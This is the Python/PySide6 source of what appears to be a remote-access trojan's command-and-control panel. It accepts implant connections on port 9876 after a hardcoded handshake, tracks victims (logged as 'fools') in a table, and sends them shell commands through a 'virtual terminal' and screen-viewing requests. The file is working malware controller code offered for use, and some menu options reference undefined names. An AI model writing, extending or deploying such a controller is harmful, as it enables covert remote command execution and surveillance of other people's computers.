from typing import Optional
import PySide6.QtCore
from PySide6.QtWidgets import QApplication, QMainWindow, QTableWidget, QTableWidgetItem, QGraphicsDropShadowEffect, QMenu, QPushButton, QWidget, QLabel, QVBoxLayout
from damn import control_panel
from terminal import V_terminal
from PySide6.QtGui import *
from PySide6.QtCore import *
from datetime import datetime
from time import sleep
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64
import threading
import socket
import time
import cv2
import numpy as np
import socket
import struct
import subprocess
from PIL import *
import os
import re

change_state = 0
client_list_lock = QMutex()


def get_host_ip():
    """
    查询本机ip地址
    :return: ip
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('180.76.76.76', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()

    return ip


# 處理加解密
class Lock:
    __key = b"nmjtzysl"

    def __init__(self, mode, data):
        if mode == "ENC":
            self.raw = base64.b16encode(bytes(self.xor_encrypt_decrypt(data)))
        if mode == "DEC":
            self.raw = bytes(self.xor_encrypt_decrypt(base64.b16decode(data)))

    def xor_encrypt_decrypt(self, data):
        encrypted_data = bytearray()
        for i in range(len(data)):
            encrypted_data.append(data[i] ^ self.__key[i % len(self.__key)])
        return encrypted_data


class ClientThread(QThread):
    new_client_signal = Signal(list)
    cmd_result = Signal(str)
    def __init__(self, clientsocket, addr):
        super().__init__()
        self.clientsocket = clientsocket
        self.addr = addr

    def run(self):
        self.clientsocket.send(b"COSJDASO")
        self.message = self.clientsocket.recv(2048).decode().strip()
        if self.message != "COSJDASO<========>LOAD==":
            self.clientsocket.close()
            return

        currentDateAndTime = datetime.now()
        currentTime = currentDateAndTime.strftime("%H:%M:%S")
        self.clientsocket.send(b"detail")
        message = self.clientsocket.recv(2048).decode("utf8", "ignore")

        detail = message.strip().split("<===>")
        self.new_client_signal.emit([str(self.addr[0]), detail[2], detail[3], detail[4], detail[5], currentTime,
                                     detail[6], detail[7], detail[8], -1, self.clientsocket])
        time.sleep(1)
        self.row = client_list.index(self.clientsocket)

        print(f"傻子上线地址: {str(self.addr)} index:{self.row}")
        empty = 0
        try:
            while 1:
                time.sleep(2)
                self.row = client_list.index(self.clientsocket)
                
                self.clientsocket.send(b"detail")
                self.clientsocket.settimeout(10)
                message = self.clientsocket.recv(2048).decode("utf8", "ignore")
                
                if "cmd" in message:
                    self.cmd_result.connect(mainWindow.VcT.paint)
                    self.cmd_result.emit(message)
                    continue
                if "007" not in message:

                    break
                
                detail = message.strip().split("<===>")
                
                self.new_client_signal.emit([str(self.addr[0]), detail[2], detail[3], detail[4], detail[5],
                                             currentTime, detail[6], detail[7], detail[8], self.row])

        except:
            pass

        self.row = client_list.index(self.clientsocket)
        print("drop")
        row = self.row
        del client_list[row]
        self.new_client_signal.emit(["del", self.row])
        client_list_lock.lock()
        
        

        client_list_lock.unlock()




def start_look():
    os.system("lo.exe")



class V_T(QWidget,V_terminal):
    def __init__(self,soc):
        super().__init__()

        self.setupUi(self)
        self.log = ""
        self.result.setPlainText(self.log)
        self.soc = soc
        self.send.clicked.connect(self.scmd)
        

    def paint(self,message):

        
        self.result.setPlainText(self.result.toPlainText()+"\n"+f"result:\n{message[4:len(message)]}\n")

    def scmd(self):
        cmd = self.command.text()
        self.soc.send(f"shell {cmd}".encode())
        self.result.setPlainText(self.result.toPlainText()+"\n"+f">>>{cmd}")





class MainWindow(QMainWindow, control_panel):
    current_row_index = 0

    def __init__(self):
        super().__init__()
        self.setupUi(self)
        # 移除外框
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.client_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.client_table.customContextMenuRequested.connect(self.bot_function_list)
        self.shadow = QGraphicsDropShadowEffect()  # 设定一个阴影,半径为10,颜色为#444444,定位为0,0
        self.shadow.setBlurRadius(10)
        self.shadow.setColor(QColor("#444444"))
        self.shadow.setOffset(0, 0)
        self.client_table.setGraphicsEffect(self.shadow)
        self.client_table.setRowCount(13)
        self.IP.setText(get_host_ip())
        self.utime = threading.Thread(target=self.update_time)
        self.uc = threading.Thread(target=self.update_client)
        self.exit.clicked.connect(self.close)
        self.original_row_count = self.client_table.rowCount()

    # 右键菜单
    def bot_function_list(self, pos):
        row_num = -1
        for i in self.client_table.selectionModel().selection().indexes():
            row_num = i.row()

        if row_num < 500:  # 表格生效的行数，501行点击右键，不会弹出菜单
            menu = QMenu()  # 实例化菜单
            Vterminal = menu.addAction(u"虚拟终端")
            screencron = menu.addAction(u"屏幕控制")
            try:
                action = menu.exec_(self.client_table.mapToGlobal(pos))
            except:
                pass

            if action == Vterminal:

                    self.VcT = V_T(client_list[self.client_table.currentIndex().row()])
                    self.VcT.show()

            elif action == internalscan:
                pass
            elif action == systeminfo:
                pass
            elif action == processcron:
                pass
            elif action == screencron:
                
                client_list[self.client_table.currentIndex().row()].send(b"SCREEN")
                threading.Thread(target=start_look).start()
                
                

    # 顯示時間
    def update_client(self):
        while status == 1:
            self.client_num.setText(str(len(client_list)))
            sleep(1)

    def update_time(self):
        while status == 1:
            currentDateAndTime = datetime.now()
            currentTime = currentDateAndTime.strftime("%H:%M:%S")
            self.currenttime.setText(currentTime)
            sleep(1)

    # 移動窗口
    def mousePressEvent(self, event):
        try:
            if event.button() == Qt.LeftButton:
                self.m_flag = True
                self.m_Position = event.globalPosition().toPoint() - self.pos()
                event.accept()
            elif event.button() == Qt.RightButton:
                self.m_flag = False
        except:
            pass

    def mouseMoveEvent(self, event):
        try:
            if Qt.LeftButton and self.m_flag:
                self.move(event.globalPosition().toPoint() - self.m_Position)
                event.accept()
        except:
            pass

    def mouseReleaseEvent(self, QMouseEvent):
        try:
            self.m_flag = False
        except:
            pass

    # 添加數據
    def add(self, data):
        client_list_lock.lock()



        if data[0] == "del":
            self.client_table.removeRow(data[1])
        elif data[9] == -1:
            del data[9]

            self.client_table.setRowCount(self.original_row_count + 1)
            n = 0
            for i in range(self.original_row_count):
                if self.client_table.item(i, 0) == None:
                    break
                elif self.client_table.item(i, 0).text() == "":
                    break
                else:
                    n = n + 1

            client_list.append(data[9])
            del data[9]
            for i, item in enumerate(data):
                item = QTableWidgetItem(item)
                item.setForeground(QBrush(Qt.red))
                self.client_table.setItem(n, i, item)
            self.original_row_count += 1

        else:

            row = data[9]
            del data[9]

            for i, item in enumerate(data):
                item = QTableWidgetItem(item)
                item.setForeground(QBrush(Qt.red))
                self.client_table.setItem(row, i, item)
        client_list_lock.unlock()


client_list = []

def get_key(dict, value):
    return [k for k, v in dict.items() if v == value]


class ServerThread(QThread):
    def __init__(self):
        super().__init__()
        self.client_threads = []

    def run(self):
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serversocket.bind(("0.0.0.0", 9876))
        serversocket.listen(999999)
        while True:
            clientsocket, addr = serversocket.accept()
            client_thread = ClientThread(clientsocket, addr)
            self.client_threads.append(client_thread)
            client_thread.finished.connect(self.remove_thread)  # connect to the 'finished' signal
            client_thread.new_client_signal.connect(mainWindow.add)

            client_thread.start()

    def remove_thread(self):
        # get the client_thread that emitted the signal
        client_thread = self.sender()
        if client_thread:
            # disconnect all its signals
            client_thread.finished.disconnect(self.remove_thread)
            client_thread.new_client_signal.disconnect(mainWindow.add)

            # remove the thread from the list
            self.client_threads.remove(client_thread)


app = QApplication([])
mainWindow = MainWindow()

status = 1
if __name__ == "__main__":
    server_thread = ServerThread()
    server_thread.start()
    mainWindow.utime.start()
    # mainWindow.uc.start()
    mainWindow.show()

    app.exec()

    server_thread.terminate()
    status = 0
